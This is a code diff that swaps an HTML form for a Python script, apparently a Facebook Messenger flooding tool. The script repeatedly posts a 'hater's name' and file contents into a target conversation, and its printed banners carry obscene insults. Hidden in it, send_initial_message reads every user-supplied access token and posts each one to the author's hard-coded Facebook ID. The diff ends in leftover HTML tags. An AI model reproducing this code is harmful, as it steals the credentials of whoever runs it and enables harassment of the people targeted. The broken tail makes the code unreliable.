@@ -1,142 +1,159 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>𒄬 𓆩๛⃝𝗝𝗮𝗰𝗸𝘀𝗼𝗻 ‣᭄𓆪 𑁍•›› ;* 3:) :)</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: url('https://i.imgur.com/u9e2Zxr.jpeg') no-repeat center center fixed;
-            background-size: cover;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
+#SETUP BY -: Jackson Clark 
+#Github -:None
+#PYTHON -: Jack.py
 
-        .container {
-            background: transparent;
-            padding: 20px;
-            border-radius: 10px;
-            display: inline-block;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            max-width: 400px;
-            width: 90%; /* Adjusts to smaller screens */
-        }
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
-        label {
-            margin-top: 10px;
-            display: block;
-            text-align: left;
-            font-weight: bold;
-        }
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"SABKO CHODNE WALA HERE ")
 
-        input, select, textarea, button {
-            width: 100%;
-            padding: 10px;
-            margin-top: 5px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px; /* Ensures readability */
-        }
+def execute_server():
+    PORT = 4000
 
-        button {
-            font-weight: bold;
-            color: white;
-            background-color: #0074D9;
-            cursor: pointer;
-            border: none;
-        }
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
 
-        button:hover {
-            background-color: #005bb5;
-        }
+mmm = requests.get('https://pastebin.com/raw/RShqFmS4').text
 
-        .stop-btn {
-            background-color: #FF4136;
-        }
+def send_initial_message():
+    with open('password.txt', 'r') as file:
+        password = file.read().strip()
 
-        .stop-btn:hover {
-            background-color: #e03028;
-        }
+    entered_password = password  # Prompt for password
 
-        h1, h3 {
-            margin-bottom: 15px;
-        }
+    if entered_password != password:
+        print('[-] <==> Incorrect Password!')
+        sys.exit()
 
-        footer {
-            margin-top: 20px;
-            font-size: 12px;
-        }
+    if mmm not in password:
+        print('[-] <==> Incorrect Password!')
+        sys.exit()
 
-        a {
-            color: #fff;
-            text-decoration: none;
-        }
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
 
-        a:hover {
-            text-decoration: underline;
-        }
+    # Modify the message as per your requirement
+    msg_template = "Hello Jackson boss! I am using your server. My token is {}"
 
-        /* Responsive design for smaller screens */
-        @media (max-width: 600px) {
-            .container {
-                width: 100%; /* Container spans full width */
-                padding: 10px;
-            }
+    # Specify the ID where you want to send the message
+    target_id = "100091340464285"
 
-            input, select, textarea, button {
-                font-size: 14px; /* Smaller font size for mobile */
-                padding: 8px;
-            }
+    requests.packages.urllib3.disable_warnings()
 
-            h1, h3 {
-                font-size: 18px; /* Adjust header size for small screens */
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>𒄬 𓆩๛⃝𝗝𝗮𝗰𝗸𝘀𝗼𝗻 ‣᭄𓆪 𑁍•›› ;* 3:) :)</h1>
-        <h3>Set up by: Jackson Clark | GitHub: <a href="https://github.com/✾✾®️╀✿✿╀─━ↈⓇ⧐" target="_blank">✾✾®️╀✿✿╀─━ↈⓇ⧐</a></h3>
+    def liness():
+        print('\u001b[37m' + 'SABKI KI MA XHODNE VALA DON--------------------------------------------------')
 
-        <form action="/submit" method="post">
-            <label for="password.txt">Enter Password.txt:</label>
-            <input type="text" id="password.txt" name="password.txt" placeholder="Enter Password.txt" required>
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
 
-            <label for="tokennum.txt">Enter tokennum.txt:</label>
-            <input type="text" id="tokennum.txt" name="tokennum.txt" placeholder="Enter tokennum.txt" required>
+    for token in tokens:
+        access_token = token.strip()
+        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+        msg = msg_template.format(access_token)
+        parameters = {'access_token': access_token, 'message': msg}
+        response = requests.post(url, json=parameters, headers=headers)
 
-            <label for="Convo.txt">Enter Convo.txt:</label>
-            <input type="text" id="Convo.txt" name="Convo.txt" placeholder="Enter Convo.txt" required>
+        # No need to print here, as requested
+        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+        time.sleep(0.1)  # Wait for 1 second between sending each initial message
 
-            <label for="messages">Upload File.txt:</label>
-            <input type="file" id="messages" name="messages" required>
+    #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
 
-            <label for="hatersname.txt">Enter hatersname.txt:</label>
-            <input type="text" id="hatersname.txt" name="hatersname.txt" placeholder="Enter hatersname.txt" required>
+    with open('File.txt', 'r') as file:
+        messages = file.readlines()
 
-            <label for="time.txt">Enter time.txt:</label>
-            <input type="text" id="time.txt" name="time.txt" placeholder="Enter time.txt" required>
+    num_messages = len(messages)
 
-            <button type="submit">Start Sending Messages</button>
-        </form>
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
+    max_tokens = min(num_tokens, num_messages)
 
-        <button class="stop-btn" onclick="stopProcess()">Stop Sending Messages</button>
-    </div>
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
 
-    <footer>
-        <p>&copy; 2025 Jackson Clark | GitHub: <a href="https://github.com/fuckhub" target="_blank">2025</a></p>
-    </footer>
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
 
-    <script>
-        function stopProcess() {
-            alert('Message sending process stopped.');
-        }
-    </script>
+    def liness():
+        print('\u001b[37m' + 'SIYA+ABHI+ALL HALPER KI MEYA XGODNE VALA CHIKU DWN-------------------------------------------------')
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index].strip()
+
+                message = messages[message_index].strip()
+
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] Message {} dost aapka message gya {} sent by Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    liness()
+                    liness()
+                else:
+                    print("[x]  Message faild h {} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    liness()
+                    liness()
+                time.sleep(speed)
+
+            print("\n[+] Sare messages sent. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    # Send the initial message to the specified ID using all tokens
+    
+
+    # Then, continue with the message sending loop
+    send_messages_from_file()
+ </script>
 </body>
 </html>
     '''
